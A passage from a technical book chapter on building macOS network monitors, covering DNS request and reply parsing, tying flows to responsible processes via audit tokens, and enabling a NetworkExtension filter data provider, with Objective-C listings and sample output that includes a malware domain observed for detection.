<span role="doc-pagebreak" epub:type="pagebreak" id="pg_165" aria-label="165"/>    [NSString stringWithUTF8String:dns_class_string(question-&gt;dnsclass)];&#13;
&#13;
    details[@"Question Type"] =&#13;
    [NSString stringWithUTF8String:dns_type_string(question-&gt;dnstype)];&#13;
&#13;
    [questions addObject:details]; <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-6: Extracting members of interest from a parsed DNS request</span></p>&#13;
<p class="TX">We make use of the <span class="SANS_TheSansMonoCd_W5Regular_11">qdcount</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">question</span> members of the DNS packet to iterate over every question <span class="CodeAnnotation" aria-label="annotation1">❶</span>. For each question, we extract its name (the domain to resolve) <span class="CodeAnnotation" aria-label="annotation2">❷</span>, its class, and its type; convert them into strings (via Apple’s <span class="SANS_TheSansMonoCd_W5Regular_11">dns_class_string</span>); and save them into a dictionary object. Finally, we save the dictionary of extracted details for each question to an array <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
<p class="TX">Now, if you perform a query via <span class="SANS_TheSansMonoCd_W5Regular_11">nslookup</span>, for example, to <i>objective-see.org</i>, the DNS monitor code will capture the request:</p>&#13;
&#13;
<pre><code># <b>/Applications/DNSMonitor.app/Contents/MacOS/DNSMonitor</b>&#13;
{&#13;
  "Process" : {&#13;
    "processPath" : "\/usr\/bin\/nslookup",&#13;
    "processSigningID" : "com.apple.nslookup",&#13;
    "processID" : 5295&#13;
  },&#13;
  "Packet" : {&#13;
    "Opcode" : "Standard",&#13;
    "QR" : "Query",&#13;
    "Questions" : [&#13;
      {&#13;
        "Question Name" : "objective-see.org",&#13;
        "Question Class" : "IN",&#13;
        "Question Type" : "A"&#13;
      }&#13;
    ],&#13;
    "RA" : "No recursion available",&#13;
    "Rcode" : "No error",&#13;
    "RD" : "Recursion desired",&#13;
    "XID" : 36565,&#13;
    "TC" : "Non-Truncated",&#13;
    "AA" : "Non-Authoritative"&#13;
  }&#13;
}&#13;
</code></pre>&#13;
<p class="TX">Next, we’ll handle DNS responses (called <i>answers</i>).</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
&#13;
<h5 class="H3"><span id="sec8"/><span class="SANS_Futura_Std_Bold_Condensed_B_11">Parsing DNS Responses</span></h5>&#13;
<p class="TNI">A DNS monitor that leverages the <span class="SANS_TheSansMonoCd_W5Regular_11">NEDNSProxyProvider</span> class is essentially a proxy, proxying both local requests and remote responses. This means that we must read the DNS request of the local flow, and then open a remote and send the request to its destination. To access any response, we read data from the remote endpoint using the <span class="SANS_TheSansMonoCd_W5Regular_11">nw_connection_receive</span> API. <a href="chapter7.xhtml#Lis7-7">Listing 7-7</a> invokes <span role="doc-pagebreak" epub:type="pagebreak" id="pg_166" aria-label="166"/>this API on the remote endpoint, then invokes the <span class="SANS_TheSansMonoCd_W5Regular_11">dns_parse_packet</span> within its callback block to parse the response.</p>&#13;
<span id="Lis7-7"/>&#13;
<pre><code>nw_connection_receive(connection, 1, UINT32_MAX,&#13;
^(dispatch_data_t content, nw_content_context_t context,&#13;
bool is_complete, nw_error_t receive_error) {&#13;
    NSData* packet = (NSData*)content;&#13;
    dns_reply_t* parsedPacket =&#13;
    dns_parse_packet(packet.bytes, (uint32_t)packet.length);&#13;
&#13;
    dns_free_reply(parsedPacket);&#13;
    ...&#13;
});&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-7: Receiving and parsing DNS responses</span></p>&#13;
<p class="TX">Although we could just print out the response using the <span class="SANS_TheSansMonoCd_W5Regular_11">dns_print_reply</span> function, let’s instead extract the answers. You’ll notice that this code, shown in <a href="chapter7.xhtml#Lis7-8">Listing 7-8</a>, is similar to the snippet that extracted the questions.</p>&#13;
<span id="Lis7-8"/>&#13;
<pre><code>NSMutableArray* answers = [NSMutableArray array];&#13;
&#13;
for(uint16_t i = 0; i &lt; parsedPacket-&gt;header-&gt;ancount; i++) { <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
    NSMutableDictionary* details = [NSMutableDictionary dictionary];&#13;
    dns_resource_record_t* answer = parsedPacket-&gt;answer[i]; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
    details[@"Answer Name"] = [NSString stringWithUTF8String:answer-&gt;name];&#13;
    details[@"Answer Class"] = [NSString stringWithUTF8String:dns_class_string(answer-&gt;&#13;
    dnsclass)];&#13;
    details[@"Answer Type"] = [NSString stringWithUTF8String:dns_type_string(answer-&gt;dnstype)];&#13;
    switch(answer-&gt;dnstype) { <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
        case ns_t_a: <span class="codewide_CodeAnnotation" aria-label="annotation4">❹</span>&#13;
            details[@"Host Address"] = [NSString stringWithUTF8String:inet_ntoa(answer-&gt;&#13;
            data.A-&gt;addr)]; <span class="codewide_CodeAnnotation" aria-label="annotation5">❺</span>&#13;
            break;&#13;
        ...&#13;
    }&#13;
    [answers addObject:details];&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-8: Extracting members of interest from a parsed DNS response</span></p>&#13;
<p class="TX">Here, however, we access the <span class="SANS_TheSansMonoCd_W5Regular_11">ancount</span> <span class="CodeAnnotation" aria-label="annotation1">❶</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">answer</span> members <span class="CodeAnnotation" aria-label="annotation2">❷</span> and then must add additional logic to extract the response’s contents. For example, we examine its type <span class="CodeAnnotation" aria-label="annotation3">❸</span> and, if it’s an IPv4 address (<span class="SANS_TheSansMonoCd_W5Regular_11">ns_t_a</span>) <span class="CodeAnnotation" aria-label="annotation4">❹</span>, convert it via the <span class="SANS_TheSansMonoCd_W5Regular_11">inet_ntoa</span> function <span class="CodeAnnotation" aria-label="annotation5">❺</span>.</p>&#13;
<p class="TX">If we run Objective-See’s DNSMonitor, which contains this code and has received the appropriate entitlement and notarization, we can see that it will capture the answer to our previous <i>objective-see.org</i> lookup:</p>&#13;
&#13;
<pre><code># <b>/Applications/DNSMonitor.app/Contents/MacOS/DNSMonitor</b>&#13;
{&#13;
  "Process" : {&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_167" aria-label="167"/>    "processPath" : "\/usr\/bin\/nslookup",&#13;
    "processSigningID" : "com.apple.nslookup",&#13;
    "processID" : 51021&#13;
  },&#13;
  "Packet" : {&#13;
    "Opcode" : "Standard",&#13;
    "QR" : "Reply",&#13;
    "Questions" : [&#13;
       {&#13;
        "Question Name" : "objective-see.org",&#13;
        "Question Class" : "IN",&#13;
        "Question Type" : "A"&#13;
       }&#13;
    ],&#13;
    "Answers" : [&#13;
      {&#13;
        "Name" : "objective-see.org",&#13;
        "Type" : "IN",&#13;
        "Host Address" : "185.199.110.153",&#13;
        "Class" : "IN"&#13;
      },&#13;
      {&#13;
        "Name" : "objective-see.org",&#13;
        "Type" : "IN",&#13;
        "Host Address" : "185.199.109.153",&#13;
        "Class" : "IN"&#13;
      },&#13;
      ...&#13;
    ],&#13;
    ...&#13;
  }&#13;
}&#13;
</code></pre>&#13;
<p class="TX">The packet type is a reply containing the original question and the answers. We also learn that the domain <i>objective-see.org</i> maps to multiple IP addresses. When run against actual malware, this information can be incred- ibly useful. Take the aforementioned iWebUpdater as an example. When it connects to <i>iwebservicescloud.com</i>, it generates a DNS request and reply:</p>&#13;
&#13;
<pre><code># <b>/Applications/DNSMonitor.app/Contents/MacOS/DNSMonitor</b>&#13;
 {&#13;
  "Process" : {&#13;
    "processPath” : "\/Users\/user\/Library\/Services\/iWebUpdate",&#13;
    "processSigningID" : nil,&#13;
    "processID" : 51304&#13;
   },&#13;
  "Packet" : {&#13;
    "Opcode" : "Standard",&#13;
    "QR" : "Query",&#13;
    "Questions" : [&#13;
      {&#13;
        "Question Name" : "iwebservicescloud.com",&#13;
        "Question Class" : "IN",&#13;
        "Question Type" : "A"&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_168" aria-label="168"/>      }&#13;
    ],&#13;
    ...&#13;
  }&#13;
},{&#13;
  "Process" : {&#13;
    "processPath" : "\/Users\/user\/Library\/Services\/iWebUpdate",&#13;
    "processSigningID" : nil,&#13;
    "processID" : 51304&#13;
  },&#13;
  "Packet" : {&#13;
    "Opcode" : "Standard",&#13;
    "QR" : "Reply",&#13;
    "Questions" : [&#13;
      {&#13;
        "Question Name" : "iwebservicescloud.com",&#13;
        "Question Class" : "IN",&#13;
        "Question Type" : "A    "&#13;
      }&#13;
    ],&#13;
    "Answers" : [&#13;
      {&#13;
        "Name" : "iwebservicescloud.com",&#13;
        "Type" : "IN",&#13;
        "Host Address" : "173.231.184.122",&#13;
        "Class" : "IN"&#13;
      }&#13;
    ],&#13;
    ...&#13;
  }&#13;
}&#13;
</code></pre>&#13;
<p class="TX">The DNS monitoring code is able to detect both the resolution request and reply. Passing either of these into an external threat intelligence platform such as VirusTotal should reveal that the domain has a history of resolving to IP addresses associated with malicious activity (including the specific IP address it resolved to here).</p>&#13;
<p class="TX">The astute reader may have noticed that the output also identified iWebUpdater as the process responsible for making this request. Let’s see how to do this now.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
&#13;
<h5 class="H3"><span id="sec9"/><span class="SANS_Futura_Std_Bold_Condensed_B_11">Identifying the Responsible Process</span></h5>&#13;
<p class="TNI">Identifying the process responsible for a DNS request is essential to detecting malware, yet DNS monitors that aren’t host-based can’t provide this information. For example, requests from trusted system processes are likely safe, while requests from, say, a persistent, unnotarized process such as iWebUpdate should be closely scrutinized.</p>&#13;
<p class="TX">Now I’ll show you how to obtain the ID of the responsible process using information provided by the <i>NetworkExtension</i> framework. The flow object passed into the extension via the <span class="SANS_TheSansMonoCd_W5Regular_11">handleNewFlow:</span> delegate method contains an instance variable named <span class="SANS_TheSansMonoCd_W5Regular_11">metaData</span> whose type is <span class="SANS_TheSansMonoCd_W5Regular_11">NEFlowMetaData</span>. <span role="doc-pagebreak" epub:type="pagebreak" id="pg_169" aria-label="169"/>Consulting the <i>NEFlowMetaData.h</i> file (found in <i>NetworkExtension.framework/Versions/A/Headers/</i>) reveals that it contains a property named <span class="SANS_TheSansMonoCd_W5Regular_11">sourceAppAuditToken</span> with the responsible process’s audit token.</p>&#13;
<p class="TX">From this audit token, we can extract the responsible process’s ID and securely obtain its path using <span class="SANS_TheSansMonoCd_W5Regular_11">SecCode*</span> APIs. <a href="chapter7.xhtml#Lis7-9">Listing 7-9</a> implements this technique.</p>&#13;
<span id="Lis7-9"/>&#13;
<pre><code>CFURLRef path = NULL;&#13;
SecCodeRef code = NULL;&#13;
audit_token_t* auditToken = (audit_token_t*)flow.metaData.sourceAppAuditToken.bytes; <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
&#13;
pid_t pid = audit_token_to_pid(*auditToken); <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
SecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef _Nullable)(@{(_bridge&#13;
NSString*)kSecGuestAttributeAudit:flow.metaData.sourceAppAuditToken}), kSecCSDefaultFlags,&#13;
&amp;code); <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
&#13;
SecCodeCopyPath(code, kSecCSDefaultFlags, &amp;path); <span class="codewide_CodeAnnotation" aria-label="annotation4">❹</span>&#13;
&#13;
// Do something with the process ID and path.&#13;
&#13;
CFRelease(path);&#13;
CFRelease(code);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-9: Obtaining the responsible process’s ID and path from a network flow</span></p>&#13;
<p class="TX">First, we initialize a pointer to an audit token. As noted, the <span class="SANS_TheSansMonoCd_W5Regular_11">sourceAppAuditToken</span> contains this token in the form of an <span class="SANS_TheSansMonoCd_W5Regular_11">NSData</span> object. To get a pointer to the audit token’s actual bytes, we use the <span class="SANS_TheSansMonoCd_W5Regular_11">bytes</span> property of the <span class="SANS_TheSansMonoCd_W5Regular_11">NSData</span> class <span class="CodeAnnotation" aria-label="annotation1">❶</span>. With this pointer, we can extract the associated process ID via the <span class="SANS_TheSansMonoCd_W5Regular_11">audit_token_to_pid</span> function <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Next, we obtain a code reference from the audit token <span class="CodeAnnotation" aria-label="annotation3">❸</span> and then invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">SecCodeCopyPath</span> function to obtain the process’s path <span class="CodeAnnotation" aria-label="annotation4">❹</span>.</p>&#13;
<p class="TX">It’s worth noting that the <span class="SANS_TheSansMonoCd_W5Regular_11">SecCodeCopyGuestWithAttributes</span> API can fail, for example, if the process has self-deleted. This case is both very unusual and likely indicative of a malicious process. Regardless, you’ll have to defer to other, less certain methods of obtaining the process’s path, such as examining the process’s arguments, which can be surreptitiously modified.</p>&#13;
<p class="TX">From the flow, we can also extract the responsible process’s code signing identifier, which can help classify the process as either benign or something to investigate further. This identifier is in the flow’s <span class="SANS_TheSansMonoCd_W5Regular_11">sourceAppSigningIdentifier</span> attribute. <a href="chapter7.xhtml#Lis7-10">Listing 7-10</a> extracts it.</p>&#13;
<span id="Lis7-10"/>&#13;
<pre><code>NSString* signingID = flow.metaData.sourceAppSigningIdentifier;</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-10: Extracting code signing information from a network flow</span></p>&#13;
<p class="TX">As noted earlier in this chapter, the DNS monitoring process I’ve described thus far would fail to detect malware such as Dummy, which connects directly to an IP address. To detect such threats, let’s expand our monitoring capabilities to examine all network traffic.</p>&#13;
</section>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_170" aria-label="170"/>&#13;
<h3 class="H1"><span id="sec10"/><span id="h1-50"/><span class="SANS_Futura_Std_Bold_B_11">Filter Data Providers</span></h3>&#13;
<p class="TNI">One of the most powerful network monitoring capabilities afforded by macOS are <i>filter data providers</i>. Implemented within a system extension and built atop the <i>NetworkExtension</i> framework, these network extensions can observe and filter all network traffic. You could use them to actively block malicious network traffic or else to passively observe all network flows, then identify potentially suspicious processes to investigate further.</p>&#13;
<p class="TX">Interestingly, when Apple introduced filter data providers along with the other network extensions, it initially decided to exempt traffic generated by various system components from filtering, even though this traffic had previously been routed through the now-deprecated network kernel extensions. This meant that security tools such as network monitors and firewalls that had previously observed all network traffic now remained blind to some of it. Unsurprisingly, abusing the exempted system components was easy and provided a stealthy way to bypass any third-party security tool built atop Apple’s network extensions. After I demonstrated this bypass, the media jumped on the story,<sup><a role="doc-noteref" id="chapter7_12" href="#chapter7-12">12</a></sup> and public outcry encouraged Apple to reevaluate its approach. Ultimately, wiser minds in Cupertino prevailed; today, all network traffic on macOS is routed through any installed filter data provider.<sup><a role="doc-noteref" id="chapter7_13" href="#chapter7-13">13</a></sup></p>&#13;
<blockquote>&#13;
<p class="NOTE"><span class="SANS_Dogma_OT_Bold_B_21">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>As with the DNS monitor, the filter data provider network extension we’ll implement here must meet the prerequisites discussed in “Using the NetworkExtension Framework” on <a href="chapter7.xhtml#pg_159">page 159</a>.</i></p>&#13;
<p class="TX">The code in this section largely comes from Objective-See’s popular open source firewall, LuLu, written by yours truly. You can find LuLu’s complete code in its GitHub repository, <a href="https://github.com/objective-see/LuLu"><i>https://<wbr/>github<wbr/>.com<wbr/>/objective<wbr/>-see<wbr/>/LuLu</i></a>.</p>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
&#13;
<h4 class="H2"><span id="sec11"/><span id="h2-56"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Enabling Filtering</span></h4>&#13;
<p class="TNI">Let’s start by programmatically activating a network extension that implements a filter data provider. This process deviates slightly from the activation of a network extension that implements DNS monitoring; instead of using an <span class="SANS_TheSansMonoCd_W5Regular_11">NEDNSProxyManager</span> object, we’ll leverage an <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterManager</span> object.</p>&#13;
<p class="TX">In the main application, use the process covered in <span class="Xref">“Activating a System Extension” on <a href="chapter7.xhtml#pg_160">page 160</a></span> to activate the extension, then enable filtering as shown in <a href="chapter7.xhtml#Lis7-11">Listing 7-11</a>.</p>&#13;
<span id="Lis7-11"/>&#13;
<pre><code>[NEFilterManager.sharedManager loadFromPreferencesWithCompletionHandler:^(NSError*&#13;
_Nullable error) { <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
    NEFilterProviderConfiguration* config = [[NEFilterProviderConfiguration alloc] init]; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
    config.filterPackets = NO; <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
    config.filterSockets = YES;&#13;
&#13;
    NEFilterManager.sharedManager.providerConfiguration = config; <span class="codewide_CodeAnnotation" aria-label="annotation4">❹</span>&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_171" aria-label="171"/>    NEFilterManager.sharedManager.enabled = YES;&#13;
&#13;
    [NEFilterManager.sharedManager&#13;
    saveToPreferencesWithCompletionHandler:^(NSError* _Nullable error) { <span class="codewide_CodeAnnotation" aria-label="annotation5">❺</span>&#13;
        // If there is no error, the filter data provider is running.&#13;
    }];&#13;
}];&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-11: Enabling filtering with an <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">NEFilterManager</span> object</span></p>&#13;
<p class="TX">First, we access the <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterManager</span> shared manager object and invoke its <span class="SANS_TheSansMonoCd_W5Regular_11">loadFromPreferencesWithCompletionHandler:</span> method <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Once this completes, we initialize an <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterProviderConfiguration</span> object <span class="CodeAnnotation" aria-label="annotation2">❷</span>. We then set two configuration options <span class="CodeAnnotation" aria-label="annotation3">❸</span>. As we’re not interested in filtering packets, we set this option to <span class="SANS_TheSansMonoCd_W5Regular_11">NO</span>. On the other hand, we want to filter socket activity, so we set this to <span class="SANS_TheSansMonoCd_W5Regular_11">YES</span>. The code then saves this configuration and sets the <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterManager</span> shared manager object to enabled <span class="CodeAnnotation" aria-label="annotation4">❹</span>. Finally, to trigger the network extension activation with this configuration, the code invokes the shared manager’s <span class="SANS_TheSansMonoCd_W5Regular_11">saveToPreferencesWithCompletionHandler:</span> method <span class="CodeAnnotation" aria-label="annotation5">❺</span>. Once this process completes, the filter data provider should be running.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
&#13;
<h4 class="H2"><span id="sec12"/><span id="h2-57"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Writing the Extension</span></h4>&#13;
<p class="TNI">As with the DNS monitor, the filter data provider is a separate binary that you must package in a bundle’s <i>Contents/Library/SystemExtensions/</i> directory. Once loaded, it should invoke NEProvider’s <span class="SANS_TheSansMonoCd_W5Regular_11">startSystemExtensionMode:</span> method. In the extension’s <i>Info.plist</i> file, we add a dictionary referenced by the key <span class="SANS_TheSansMonoCd_W5Regular_11">NEProviderClasses</span> containing a single key-value pair (<a href="chapter7.xhtml#Lis7-12">Listing 7-12</a>).</p>&#13;
<span id="Lis7-12"/>&#13;
<pre><code>&lt;key&gt;NEProviderClasses&lt;/key&gt;&#13;
&lt;dict&gt;&#13;
    &lt;key&gt;com.apple.networkextension.filter-data&lt;\d&gt;/key&gt;&#13;
    &lt;string&gt;FilterDataProvider&lt;/string&gt;&#13;
&lt;/dict&gt;&#13;
...&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-12: The extension’s</span> <span class="SANS_Futura_Std_Book_11">Info.plist</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">file, which specifies the extension’s <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">NEProviderClasses</span> class</span></p>&#13;
<p class="TX">We set the key to <span class="SANS_TheSansMonoCd_W5Regular_11">com.apple.networkextension.filter-data</span> and the value to the name of our class in the extension that inherits from <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterDataProvider</span>. In this example, we’ve named the class <span class="SANS_TheSansMonoCd_W5Regular_11">FilterDataProvider</span>, which we declare as such (<a href="chapter7.xhtml#Lis7-13">Listing 7-13</a>).</p>&#13;
<span id="Lis7-13"/>&#13;
<pre><code>@interface FilterDataProvider : NEFilterDataProvider&#13;
    ...&#13;
@end&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-13: An interface definition for the <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">FilterDataProvider</span> class</span></p>&#13;
<p class="TX">Once the filter data provider extension is up and running, the <i>NetworkExtension</i> framework will automatically invoke this class’s <span class="SANS_TheSansMonoCd_W5Regular_11">startFi</span><span role="doc-pagebreak" epub:type="pagebreak" id="pg_172" aria-label="172"/><span class="SANS_TheSansMonoCd_W5Regular_11">lterWithCompletionHandler</span> method, where you’ll specify what traffic you’d like to filter. The code in <a href="chapter7.xhtml#Lis7-14">Listing 7-14</a> filters all protocols but only for outgoing traffic, which is more helpful than incoming traffic for detecting unauthorized or new programs that could be malware.</p>&#13;
<span id="Lis7-14"/>&#13;
<pre><code>-(void)startFilterWithCompletionHandler:(void (^)(NSError* error))completionHandler {&#13;
    NENetworkRule* networkRule = [[NENetworkRule alloc] initWithRemoteNetwork:nil&#13;
    remotePrefix:0 localNetwork:nil localPrefix:0 protocol:NENetworkRuleProtocolAny&#13;
    direction:NETrafficDirectionOutbound]; <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
&#13;
    NEFilterRule* filterRule =&#13;
    [[NEFilterRule alloc] initWithNetworkRule:networkRule action:NEFilterActionFilterData]; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
    NEFilterSettings* filterSettings =&#13;
    [[NEFilterSettings alloc] initWithRules:@[filterRule] defaultAction:NEFilterActionAllow]; <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
&#13;
    [self applySettings:filterSettings completionHandler:^(NSError* _Nullable error) { <span class="codewide_CodeAnnotation" aria-label="annotation4">❹</span>&#13;
        // If no error occurred, the filter data provider is now filtering.&#13;
    }];&#13;
    ...&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-14: Setting filter rules to specify which traffic should be routed through the extension</span></p>&#13;
<p class="TX">First, the code creates an <span class="SANS_TheSansMonoCd_W5Regular_11">NENetworkRule</span> object, setting the protocol filter option to any and the direction filter option to outbound <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Then it uses this <span class="SANS_TheSansMonoCd_W5Regular_11">NENetworkRule</span> object to create an <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterRule</span> object. It also specifies an action of <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterActionFilterData</span> to tell the <i>NetworkExtension</i> framework that we want to filter data <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Next, it creates an <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterSettings</span> object with the filter rule we just created that matches all outbound traffic. Specifying <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterActionAllow</span> for the default action means any traffic that doesn’t match this filter rule will be allowed <span class="CodeAnnotation" aria-label="annotation3">❸</span>. Finally, it applies the settings to begin the filtration <span class="CodeAnnotation" aria-label="annotation4">❹</span>.</p>&#13;
<p class="TX">Now, anytime a program on the system initiates a new outbound network connection, the system automatically invokes the <span class="SANS_TheSansMonoCd_W5Regular_11">handleNewFlow:</span> delegate method in our filter class. Though it shares the same name, this delegate method differs from the one we used for DNS monitoring in a few ways. It takes a single argument (an <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterFlow</span> object that contains information about the flow) and, upon returning, must instruct the system on how to handle the flow. It does so via an <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterNewFlowVerdict</span> object, which can specify verdicts such as allow (<span class="SANS_TheSansMonoCd_W5Regular_11">allowVerdict</span>), drop (<span class="SANS_TheSansMonoCd_W5Regular_11">dropVerdict</span>), or pause (<span class="SANS_TheSansMonoCd_W5Regular_11">pauseVerdict</span>). Because we’re focusing on tying a flow to its responsible process, we’ll always allow the flow (<a href="chapter7.xhtml#Lis7-15">Listing 7-15</a>).</p>&#13;
<span id="Lis7-15"/>&#13;
<pre><code>-(NEFilterNewFlowVerdict*)handleNewFlow:(NEFilterFlow*)flow {&#13;
    ...&#13;
    return [NEFilterNewFlowVerdict allowVerdict];&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-15: Returning a verdict from the <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">handleNewFlow</span>: method</span></p>&#13;
<p class="TX">If we were building a firewall, we would instead consult the firewall’s rules or alert the user before allowing or blocking each flow.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_173" aria-label="173"/>&#13;
<h4 class="H2"><span id="sec13"/><span id="h2-58"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Querying the Flow</span></h4>&#13;
<p class="TNI">By querying the flow, we can extract information such as its remote end-point and the process responsible for generating it. First, let’s just print out the flow object. For example, here is a flow generated by <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> when attempting to connect to <i>objective-see.org</i>:</p>&#13;
&#13;
<pre><code>flow:&#13;
    identifier = D89B5B5D-793C-4940-80FE-54932FAA0500&#13;
    sourceAppIdentifier =.com.apple.curl&#13;
    sourceAppVersion =&#13;
    sourceAppUniqueIdentifier =&#13;
    {length = 20, bytes = 0xbbb73e021281eee708f86d974c91182e955de441}&#13;
    procPID = 26686&#13;
    eprocPID = 26686&#13;
    direction = outbound&#13;
    inBytes = 0&#13;
    outBytes = 0&#13;
    signature =&#13;
    {length = 32, bytes = 0x5a322cd8 f14f63bc a117ddf5 1762fa5abb8291c9 2b6ab2fd}&#13;
    socketID = 5aa2f9354fe80&#13;
    localEndpoint = 0.0.0.0:0&#13;
    remoteEndpoint = 185.199.108.153:80&#13;
    remoteHostname = objective-see.org.&#13;
    protocol = 6&#13;
    family = 2&#13;
    type = 1&#13;
    procUUID = 9C547A5F-AD1C-307C-8C16-426EF9EE2F7F&#13;
    eprocUUID = 9C547A5F-AD1C-307C-8C16-426EF9EE2F7F&#13;
</code></pre>&#13;
<p class="TX">Besides information about the responsible process, such as its app ID, we can see details about the destination, including both an endpoint and a hostname. The flow object also contains information about the type of flow, including its protocol and socket family.</p>&#13;
<p class="TX">Now let’s extract more granular information. Recall that when configuring the filter, we told the system we were interested only in filtering sockets. As such, the flow passed into the <span class="SANS_TheSansMonoCd_W5Regular_11">handleNewFlow:</span> method will be an <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterSocketFlow</span> object, which is a subclass of the <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterFlow</span> class. These objects have an instance variable called <span class="SANS_TheSansMonoCd_W5Regular_11">remoteEndpoint</span> containing an object of type <span class="SANS_TheSansMonoCd_W5Regular_11">NWEndpoint</span>, which itself contains information about the flow’s destination. You can extract the IP address of the remote endpoint via the <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterSocketFlow</span> object’s <span class="SANS_TheSansMonoCd_W5Regular_11">hostname</span> instance variable and retrieve its port from the <span class="SANS_TheSansMonoCd_W5Regular_11">port</span> variable, both of which are stored as strings (<a href="chapter7.xhtml#Lis7-16">Listing 7-16</a>).</p>&#13;
<span id="Lis7-16"/>&#13;
<pre><code>NSString* addr = ((NEFilterSocketFlow*)flow).remoteEndpoint.hostname;&#13;
NSString* port = ((NEFilterSocketFlow*)flow).remoteEndpoint.port;&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-16: Extracting the remote endpoint’s address and port</span></p>&#13;
<p class="TX">These <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterSocketFlow</span> objects also contain low-level information about the flow, including the socket family, type, and protocol. <a href="chapter7.xhtml#tab7-1">Table 7-1</a> summarizes these, but you can learn more about them in Apple’s <i>NEFilterFlow.h</i>.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_174" aria-label="174"/>&#13;
<table class="Basic-Table">&#13;
<caption><p class="TT" id="tab7-1"><span class="SANS_Futura_Std_Heavy_B_11">Table 7-1:</span> <span class="SANS_Futura_Std_Book_11">Low-Level Flow Information in</span> <span class="SANS_TheSansMonoCd_W5Regular_11">NEFilterSocketFlow</span> <span class="SANS_Futura_Std_Book_11">Objects</span></p></caption>&#13;
<thead>&#13;
<tr>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Variable name</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Type</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Description</span></p></th>&#13;
</tr>&#13;
</thead>&#13;
